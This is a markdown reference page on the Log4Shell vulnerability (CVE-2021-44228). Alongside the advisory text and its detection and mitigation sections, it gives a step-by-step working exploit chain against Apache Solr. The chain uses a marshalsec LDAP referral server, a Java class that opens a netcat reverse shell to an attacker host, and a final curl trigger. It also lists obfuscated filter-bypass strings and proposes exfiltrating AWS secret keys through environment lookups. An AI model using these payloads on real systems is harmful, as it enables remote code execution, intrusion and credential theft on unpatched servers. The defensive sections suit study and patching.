Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.

Reference: [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)

[Massive Resource](https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/)

# Affected versions

Any Log4J version prior to v2.15.0 is affected to this specific issue.

The v1 branch of Log4J which is considered End Of Life (EOL) is vulnerable to other RCE vectors so the recommendation is to still update to 2.16.0 where possible.

[Vulnerable Software & Services | Log4jAttackSurface](https://github.com/YfryTchsGD/Log4jAttackSurface)

## Affected packages

Only the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` package is included on this advisory to prevent version desync which may occur as a result of dependabot actions.

# Exploitation

The attack vector is extremely trivial for threat actors. A single string of text can trigger an application to reach out to an external location if it is logged via the vulnerable instance of log4j. 

A threat actor might supply special text in an HTTP User-Agent header or a simple POST form request, with the usual form:

`${jndi:ldap://maliciousexternalhost.com/resource`

The log4j vulnerability parses this and reaches out to the malicious host via the “Java Naming and Directory Interface” (JNDI). The first-stage resource acts as a springboard to another attacker-controlled endpoint, which serves Java code to be executed on the original victim.

The JNDI abuse is easily performed by a public and accessible utility, [JDNIExploit](https://github.com/feihong-cs/JNDIExploit). The use of this tool by a threat actor can provide worthwhile discovery and analysis from defenders in reviewing logs—the executed commands are typically included within the URL as Base64 encoded text. These look like queries:

`${jndi:ldap://MALICIOUSHOST.COM:PORT/Basic/Command/Base64/LoNGeNcoDeDcOmMaNd`

Payloads have also [been discovered](https://twitter.com/shutingrz/status/1469255861394866177?s=21) using a `jndi:dns://` schema rather than LDAP. 

## Example payloads
### Generic payload (targeting Apache solr 8.11.0)
`http://MACHINE_IP/solr/admin/cores?foo=$\{jndi:ldap://ATTACKERIP:PORT/code}'`

To stage an "LDAP Referral Server" use [marshalsec utility](https://github.com/mbechler/marshalsec). For this you need to run Java 1.8.0_181 ( [mirror of Java versions](http://mirrors.rootpei.com/jdk/))

```bash
sudo mkdir /usr/lib/jvm

cd /usr/lib/jvm

sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz    # modify as needed

sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1

sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
```

Build marshalsec with the Java builder maven. `sudo apt install maven`.
```bash
~/root/marshalsec$ mvn clean package -DskipTests
```

With the marshalsec utility built, start an LDAP referral server to direct connections to our secondary HTTP server hosting the malicious code. Example syntax to start the LDAP server:

```bash
marshalsec$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKERIP:8000/Exploit.java"

Listening on 0.0.0.0:1389
```

Create the Exploit.java code
```java
public class Exploit { 
	static { 
		try { 
			# Assumes that target has netcat installed
			java.lang.Runtime.getRuntime().exec("nc -e /bin/bash ATTACKERIP 9999"); 
		} catch (Exception e) { 
			e.printStackTrace(); 
		} 
	} 
}
```

Compile code
```bash
$ javac Exploit.java -source 8 -target 8
```

To host malicious code open a python or php server locally.

-   `**python3 -m http.server**`
-   `**php -S 0.0.0.0:8000**`
-   (or any other `**busybox httpd**` or formal web service you might like)

Now, open a netcat listener `nc -lnvp 9999`.

Final payload

```bash
curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://ATTACKERIP:1389/Exploit\}'
```


# Detection

[Huntress Log4Shell Vulnerability Tester](https://log4shell.huntress.com/)

[Log4Shell-Hashes](https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes) (local, based off hashes of log4j JAR files)

[log4j2-class-md5sum](https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d) (local, based off hashes of log4j CLASS files)

[Vulnerable JAR and CLASS hashes](https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228)

[Invoke-Log4ShellScan.ps1](https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1) (local, hunting for vulnerable log4j packages in PowerShell)

[Log4J-CVE-Detect](https://github.com/darkarnium/CVE-2021-44228) (local, YARA rules)

[grep commands & YARA rules](https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b) for detection of CVE-2021-44228 exploitation.

# Bypasses

```bash
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME: l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}

${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}

${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}

${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}

${${::-j}ndi:rmi://attackerendpoint.com/}

``````

Note the use of the `rmi://` protocol in the last one. This is also another valid technique that can be used with the `marshalsec` utility -- feel free to experiment!

Additionally, within the log4j engine, you can expand arbitrary environment variables. Consider the damage that could be done even with RCE, but a simple LDAP connection and exfiltration of `${env:AWS_SECRET_ACCESS_KEY}`

# Mitigation

For Log4j versions >=2.10  
set the system property log4j2.formatMsgNoLookups or the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS to true  

For Log4j versions >=2.7 and <=2.14.1  
all PatternLayout patterns can be modified to specify the message converter as `%m{nolookups}` instead of just `%m`  

For Log4j versions >=2.0-beta9 and <=2.10.0  
remove the JndiLookup class from the classpath. For example:  

`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`  

On OpenShift 4 and in OpenShift Logging, the above mitigation can be applied by following the steps in this article: [https://access.redhat.com/solutions/6578421](https://access.redhat.com/solutions/6578421)  

On OpenShift 3.11, mitigation to the affected Elasticsearch component can be applied by following the steps in this article: [https://access.redhat.com/solutions/6578441](https://access.redhat.com/solutions/6578441)


`log4j` version `2.16.0` is available and patches this vulnerability (JNDI is fully disabled, support for Message Lookups is removed, and the new DoS vulnerability CVE-2021-45046 is not present). [https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0](https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0)


Resources:

[Log4Shell log4j vulnerability (CVE-2021-44228 / CVE-2021-45046) - cheat-sheet reference guide](https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/)

[Massive Resource](https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/)
